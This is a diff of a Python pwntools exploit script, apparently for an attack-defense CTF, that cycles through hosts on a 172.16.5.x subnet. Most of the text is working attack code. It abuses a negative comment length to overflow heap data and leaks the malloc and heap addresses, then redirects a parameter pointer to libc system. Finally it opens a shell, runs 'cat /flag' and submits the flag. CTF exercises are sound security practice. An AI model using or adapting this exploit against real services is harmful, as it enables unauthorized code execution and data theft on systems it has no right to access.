@@ -10,15 +10,14 @@ while 1:
                 continue
             if debug:
                 context.log_level = 'debug'
-                p = process('./autoexp')
-                gdb.attach(p, execute='b *0x04017BB')
-                e = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+                p=process('./autoexp')
+                gdb.attach(p)
+                e=ELF('/lib/x86_64-linux-gnu/libc.so.6')
             else:
-                p = remote('172.16.5.{}'.format(x), 5005, timeout=5)
-                e = ELF('./server.libc')
+                p=remote('172.16.5.{}'.format(x),5005,timeout=5)
+                e=ELF('./server.libc')
 
-
-            def add(name, parameters, datas):
+            def add(name,parameters,datas):
                 p.recvuntil('Option:')
                 p.sendline('1')
                 p.recvuntil(':')
@@ -38,8 +37,19 @@ while 1:
                     p.sendline(datas)
                 p.sendline()
 
+            def modifyParam(funindex,paramindex,content):
+                p.recvuntil('Option:')
+                p.sendline('3')
+                p.recvuntil(':')
+                p.sendline(str(funindex))
+                p.recvuntil('Option:')
+                p.sendline('5')
+                p.recvuntil(':')
+                p.sendline(str(paramindex))
+                p.recvuntil('content')
+                p.sendline(content)
 
-            def comment(funindex, length, cmt):
+            def comment(funindex,length,cmt):
                 p.recvuntil('Option:')
                 p.sendline('3')
                 p.recvuntil(':')
@@ -49,50 +59,38 @@ while 1:
                 p.recvuntil('the length of your comment')
                 p.sendline(str(length))
                 p.sendline(cmt)
-
-
-            def deletefun(index):
+            def leak(addr):
+                comment(1, -1, 'a' * 0x18 + p64(0x31) + p64(addr))
                 p.recvuntil('Option:')
-                p.sendline('2')
-                p.recvuntil(':')
-                p.sendline(str(index))
+                p.sendline('4')
+                p.recvuntil('2: ')
+                p.sendline('99')
+                return u64(p.recvuntil('\n')[:-1].ljust(8, '\x00'))
 
-
-            def modifyData(funindex, paramindex, content):
-                p.recvuntil('Option:')
-                p.sendline('3')
-                p.recvuntil(':')
-                p.sendline(str(funindex))
-                p.recvuntil('Option:')
-                p.sendline('6')
-                p.recvuntil(':')
-                p.sendline(str(paramindex))
-                p.recvuntil('content')
-                p.sendline(content)
-
-
-            add('fun1', 'p1', 'd1')
-            comment(1, 22, 'aaaa')
-            add('fun2', 'p2', 'd2')
-            deletefun(1)
-            add('fun3', 'p3', 'd3')
-            comment(2, 4, '\x28\x32\x60')
+            add('fun1','p1','d1')
+            comment(1,20,'aaaa')
+            add('fun2','p2','d2')
+            malloc=leak(0x603210)
+            heap=leak(0x6036E8)
+            log.success('malloc:'+hex(malloc))
+            log.success('heap:'+hex(heap))
+            paramlist=0x0603700
+            comment(1, -1, p64(0x603228)+'a' * 0x10+ p64(0x31) + p64(0x603210)+p64(paramlist))
             p.recvuntil('Option:')
-            p.sendline('5')
-            p.recvuntil('fun3')
-            p.recvuntil('writeline(')
-            d = p.recvuntil(')')[:-1].ljust(8, '\x00')
-            atoi = u64(d)
-            log.success('atoi:' + hex(atoi))
-            system = atoi - e.symbols['atoi'] + e.symbols['system']
-            modifyData(2, 1, p64(system))
+            p.sendline('6')
+            p.recvuntil('Option:')
+            p.sendline('2')
+            p.recvuntil('exploit')
+            p.sendline(p64(0x603228))
+            system=malloc-e.symbols['malloc']+e.symbols['system']
+            modifyParam(2,1,p64(system))
             p.sendline()
             p.recvuntil('Option:')
             p.sendline('sh')
             p.sendline('cat /flag')
             p.recvuntil('\n')
-            f = p.recvuntil('\n')[:-1]
-            log.success('flag:' + f)
+            f=p.recvuntil('\n')[:-1]
+            log.success('flag:'+f)
             print flag.send(f)
             p.close()
         except Exception as e:
